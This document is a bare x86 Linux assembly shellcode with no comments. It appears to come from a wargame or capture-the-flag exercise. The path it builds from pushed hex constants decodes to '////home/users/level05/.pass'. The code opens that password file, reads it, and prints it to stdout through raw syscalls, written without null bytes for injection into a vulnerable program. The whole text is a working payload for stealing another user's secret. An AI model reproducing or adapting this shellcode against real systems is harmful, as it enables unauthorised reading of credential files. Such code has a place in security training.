global _start

section .text

_start:
  xor ecx, ecx
  mul ecx

open:
  mov al, 0x05
  push ecx
  push 0x73736170
  push 0x2e2f3530
  push 0x6c657665
  push 0x6c2f7372
  push 0x6573752f
  push 0x656d6f68
  push 0x2f2f2f2f
  mov ebx, esp
  int 0x80

read:
  xchg eax, ebx
  xchg eax, ecx
  mov al, 0x03
  mov dx, 0x0FFF
  inc edx
  int 0x80

write:
  xchg eax, edx
  mov bl, 0x01
  shr eax, 0x0A
  int 0x80

exit:
  xchg eax, ebx
  int 0x80
